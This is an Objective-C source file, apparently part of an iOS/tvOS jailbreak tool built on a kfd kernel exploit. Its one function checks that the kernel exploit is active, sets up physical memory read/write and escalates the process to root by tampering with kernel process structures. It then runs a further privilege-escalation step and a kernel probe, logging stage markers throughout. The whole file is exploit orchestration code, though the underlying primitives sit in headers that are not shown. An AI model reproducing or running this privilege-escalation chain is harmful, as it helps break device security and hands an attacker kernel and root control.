#import "dt_build694_client.h"
#import "dt_kcall_planb.h"
#import "dt_physrw.h"
#import "DTRunLogger.h"
#import "kfd_tvos.h"
#import "dt_kernel_exploit.h"
#import "primitives.h"
#import "kernel.h"

#import <unistd.h>

typedef void (^dt694_log_fn)(NSString *line);

static void dt694_log(dt694_log_fn log, NSString *line)
{
    [[DTRunLogger shared] log:line];
    if (log)
        log(line);
}

static void dt694_emit(dt694_log_fn log, NSString *marker)
{
    dt694_log(log, marker);
    [[DTRunLogger shared] logStage:marker];
}

int dt_build694_run_wall2_restore_probe(void (^log)(NSString *line), NSString **verdictOut)
{
    dt694_emit(log, @"KCALL694_UI_TAP");
    dt694_emit(log, @"KCALL694_PHASE_BEGIN");

    if (!dt_kernel_exploit_is_active()) {
        if (verdictOut)
            *verdictOut = @"KCALL694_KFD_INACTIVE";
        return -1;
    }

    if (dt_build_physrw_handoff_only(log) != 0) {
        if (verdictOut)
            *verdictOut = @"KCALL694_PHYSRW_FAIL";
        return -2;
    }

    if (getuid() != 0) {
        uint64_t proc = proc_find(getpid());
        if (proc && dt_build_phys_root_esc(proc, log) == 0 && getuid() == 0) {
            dt694_log(log, @"[+] build694 root esc OK uid=0");
        }
        if (proc)
            proc_rele(proc);
    }

    if (getuid() != 0) {
        if (verdictOut)
            *verdictOut = @"KCALL694_ROOT_FAIL";
        return -3;
    }

    int priv_r = -1;
    uint64_t self_proc = proc_find(getpid());
    if (self_proc) {
        priv_r = dt_build97_privesc_preserve_slot0(self_proc, log);
        proc_rele(self_proc);
    }
    if (priv_r != 0) {
        if (verdictOut)
            *verdictOut = @"KCALL694_BUILD97_FAIL";
        return -4;
    }

    dt694_emit(log, @"KCALL694_NO_OPAINJECT");
    dt694_emit(log, @"KCALL694_NO_AMFI");
    dt694_emit(log, @"KCALL694_NO_USERREBOOT");
    dt694_emit(log, @"KCALL694_NO_LAUNCHDHOOK");

    NSString *kernelVerdict = nil;
    int r = dt694_run_wall2_restore_sync_probe(log, &kernelVerdict);
    if (r != 0) {
        if (verdictOut)
            *verdictOut = kernelVerdict ?: @"KCALL694_WALL2_RESTORE_SYNC_FAIL";
        return r;
    }

    if (verdictOut)
        *verdictOut = kernelVerdict ?: @"KCALL694_WALL2_RESTORE_SYNC_PASS";
    dt694_emit(log, @"KCALL694_PHASE_PASS");
    return 0;
}
